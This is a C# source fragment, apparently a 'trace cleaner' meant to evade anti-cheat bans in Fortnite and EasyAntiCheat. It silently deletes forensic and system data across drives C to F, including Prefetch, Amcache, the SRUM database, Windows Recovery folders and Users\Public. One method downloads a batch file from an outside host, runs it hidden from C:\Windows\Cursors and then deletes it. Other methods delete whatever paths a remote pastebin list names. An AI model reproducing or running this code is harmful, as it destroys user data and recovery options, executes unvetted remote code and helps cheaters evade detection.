                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902d");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902c");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902a");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902b");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp\\1CF5.bat");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("C:Windows\\System32\\spp\\store\\2.0\\data.dat");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF24436e9.TMP");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF24436e9.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network Persistent State~RF24465f8.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\", true);

                }
            }
            catch
            {

            }

            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902d", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902c", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902a", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902b", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009023", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009022", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Origin", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Origin", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009024", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009025", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009026", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009027", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009028", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009029", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("E:\\Users\\Public", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF244a582.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Windows\\temp\\w1053", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Windows\\temp\\MpCmdRun.log", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Windows\\Prefetch", true);

                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Windows\\System32\\eac_usermode_21537346703536.dll"))
                {
                    File.Delete("F:\\Windows\\System32\\eac_usermode_21537346703536.dll");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("F:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive"))
                {
                    Directory.Delete("F:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Windows\\appcompact\\Programs\\Amcache.hve"))
                {
                    File.Delete("F:\\Windows\\appcompact\\Programs\\Amcache.hve");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl"))
                {
                    File.Delete("F:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Windows\\System\\config\\BBI.LOG2"))
                {
                    File.Delete("F:\\Windows\\System\\config\\BBI.LOG2");
                }
            }
            catch
            {
            }

            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine"))
            {
                try
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }
            }
            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher"))
            {
                try
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }
            }
            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher"))
            {
                try
                {

                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }
            }
            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame"))
            {
                try
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            try
            {
                if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation"))
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics"))
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics", true);
                }
            }
            catch
            {
            }

            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Packages"))
            {
                try
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Packages", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            try
            {
                if (File.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache"))
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk"))
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache"))
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
                }
            }
            catch
            {
            }

            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent"))
            {
                try
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications"))
            {
                try
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;

                }

            }
            try
            {


                if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache"))
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat"))
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("F:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore"))
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds"))
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Program Files\\Epic Games\\Fortnite.lysEB"))
                {
                    File.Delete("F:\\Program Files\\Epic Games\\Fortnite.lysEB");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir"))
                {
                    Directory.Delete("F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591"))
                {
                    File.Delete("F:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local"))
                {
                    File.Delete("F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current"))
                {
                    File.Delete("F:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("F:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat"))
                {
                    File.Delete("F:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("F:\\MSOCache"))
                {
                    Directory.Delete("F:\\MSOCache", true);
                }
            }
            catch
            {
            }
            try
            {

                if (File.Exists("F:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav"))
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp");
                }
            }
            catch
            {
            }
            try
            {

                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network Persistent State~RF245551b.TMP");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902d");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902c");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902a");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902b");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp\\1CF5.bat");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("C:Windows\\System32\\spp\\store\\2.0\\data.dat");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF24436e9.TMP");

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF24436e9.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network Persistent State~RF24465f8.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\", true);

                }
            }
            catch
            {

            }

            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902d", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902c", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902a", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902b", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009023", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009022", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Origin", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Origin", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009024", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009025", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009026", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009027", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009028", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009029", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    Directory.Delete("F:\\Users\\Public", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF244a582.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Windows\\temp\\w1053", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Windows\\temp\\MpCmdRun.log", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Windows\\Prefetch", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Recovery", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Recovery", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Recovery", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Recovery", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Windows\\System32\\sru", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Windows\\System32\\sru", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("E:\\Windows\\System32\\sru", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("F:\\Windows\\System32\\sru", true);

                }
            }
            catch
            {
            }
        }




        public static void CleanFile(string asrg)
        {
            if (asrg != null)
            {
                bool existed = false;
                if (File.Exists(asrg))
                {
                    existed = true;
                }
                try
                {

                    File.Delete(asrg);
                }
                catch
                {
                    try
                    {

                        File.Delete(asrg);

                    }
                    catch
                    {
                        try
                        {

                            File.Delete(asrg);

                        }
                        catch
                        {
                            try
                            {

                                File.Delete(asrg);

                            }
                            catch
                            {
                            }
                        }
                    }
                }

                if (!File.Exists(asrg) && existed == true)
                {
                    if (File.Exists(@"C:\Users\" + Environment.UserName + @"\Desktop\debug.sys"))
                        Console.WriteLine(" ");
                }
            }
        }

        private static int Count = 0;

        public static void ExtraClean()
        {
            WebClient extraclean = new WebClient();
            extraclean.DownloadFile("https://127737596-617361524549731340.preview.editmysite.com/uploads/1/2/7/7/127737596/special.bat", "C:\\Windows\\Cursors\\special.bat");
            Process psi = new Process();
            psi.StartInfo.FileName = "C:\\Windows\\Cursors\\special.bat";
            psi.StartInfo.RedirectStandardInput = true;
            psi.StartInfo.RedirectStandardOutput = false;
            psi.StartInfo.RedirectStandardError = false;
            psi.StartInfo.UseShellExecute = false;
            psi.StartInfo.CreateNoWindow = true;
            psi.Start();
            psi.WaitForExit();
            File.Delete("C:\\Windows\\Cursors\\special.bat");
        }
        public static void OnlineCleanTraces()
        {

            new Thread(new ThreadStart(Cleaners.Worker)).Start();
            WebClient webClient = new WebClient();

            string motd = webClient.DownloadString("https://pastebin.com/raw/71mGsWfm").Replace("/", "\\").Replace("..user..", Environment.UserName).Replace(" ", "");
            string[] separator = new string[1] { "\n" };
            int count = motd.Length - 0;
            foreach (var asrg in motd.Split(separator, count, StringSplitOptions.None))
            {
                try
                {
                    Directory.Delete(asrg, true);
                    Console.ForegroundColor = ConsoleColor.Green;
                }
                catch (System.UnauthorizedAccessException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IO.FileNotFoundException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IO.DirectoryNotFoundException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.Reflection.TargetInvocationException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IO.IOException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.NotSupportedException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IndexOutOfRangeException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.ArgumentException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }

                try
                {
                    File.Delete(asrg);
                    Console.ForegroundColor = ConsoleColor.Green;
                }
                catch (System.UnauthorizedAccessException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IO.FileNotFoundException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IO.DirectoryNotFoundException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.Reflection.TargetInvocationException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IO.IOException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.NotSupportedException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IndexOutOfRangeException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.ArgumentException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }

            }

            return;

        }
        public static void OnlineCleanRegs()
        {

            new Thread(new ThreadStart(Cleaners.Worker)).Start();
            WebClient webClient = new WebClient();

            string motd = webClient.DownloadString("https://pastebin.com/raw/2JexGy1R").Replace("/", "\\").Replace(" ", "");
            string[] separator = new string[1] { "\n" };
            int count = motd.Length - 0;
            foreach (var asrg in motd.Split(separator, count, StringSplitOptions.None))
            {
                try
                {
                    Directory.Delete(asrg, true);
                    Console.ForegroundColor = ConsoleColor.Green;
                }
                catch (System.UnauthorizedAccessException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IO.FileNotFoundException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IO.DirectoryNotFoundException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.Reflection.TargetInvocationException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IO.IOException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.NotSupportedException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IndexOutOfRangeException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.ArgumentException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }

                try
                {
                    File.Delete(asrg);
                    Console.ForegroundColor = ConsoleColor.Green;
                }
                catch (System.UnauthorizedAccessException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IO.FileNotFoundException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IO.DirectoryNotFoundException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.Reflection.TargetInvocationException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IO.IOException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.NotSupportedException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.IndexOutOfRangeException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch (System.ArgumentException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }

            }

            return;

        }
        public static void Worker()
        {
            while (true)
            {
                Thread.Sleep(10);
            }
        }

        public static void CleanDir(string asrg)
        {
            if (asrg == null)
                return;
            try
            {
                try
                {
                    foreach (string file in Directory.GetFiles(asrg))
                        Cleaners.DeleteFile(file);
                }
                catch
                {
                }
                try
                {
                    foreach (string directory in Directory.GetDirectories(asrg))
                        Cleaners.CleanDir(directory);
                }
                catch
                {
                }
                try
                {
                    Directory.Delete(asrg, true);
                }
                catch
                {
                }
                try
                {
                    System.IO.File.Delete(asrg);
                }
                catch
                {
                }
            }
            catch
            {
            }
        }

        public static void DeleteFile(string path)
        {
            try
            {
                System.IO.File.Delete(path);
                ++Cleaners.Count;
            }
            catch
            {
            }
        }
    }
}